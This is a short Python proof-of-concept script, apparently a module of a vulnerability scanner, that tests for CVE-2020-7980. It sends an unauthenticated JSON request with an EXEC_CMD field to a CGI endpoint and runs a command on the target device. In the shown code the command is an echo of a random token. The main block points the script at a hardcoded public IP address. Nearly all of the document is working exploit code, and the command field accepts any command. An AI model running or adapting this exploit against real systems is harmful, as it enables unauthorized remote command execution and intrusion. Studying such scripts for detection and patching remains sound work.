#!/usr/bin/env python3

'''
name: CVE-2020-7980漏洞
description: CVE-2020-7980漏洞可执行任意命令
'''

import time
import calendar
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class CVE_2020_7980_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta()
        self.data = {
                    "O_":"A",
                    "V_":1,
                    "S_":123456789,
                    "F_":"EXEC_CMD",
                    "P1_":{
                        "F":"EXEC_CMD",
                        "Q":'echo %s' % (self.capta)
                        }
                    }

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            cmd_request = request.post(self.url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json = self.data, cookies = {'ctr_t': '0', 'sid': '123456789'})
            if cmd_request.status_code == 200 and self.capta in cmd_request.text:
                result = cmd_request.text.split()[-2].replace('},', '')
                print("存在CVE-2020-7980漏洞,执行结果为:", result)
                return True
            else:
                print("不存在CVE-2020-7980漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2020_7980 = CVE_2020_7980_BaseVerify('http://185.23.98.50')
    CVE_2020_7980.run()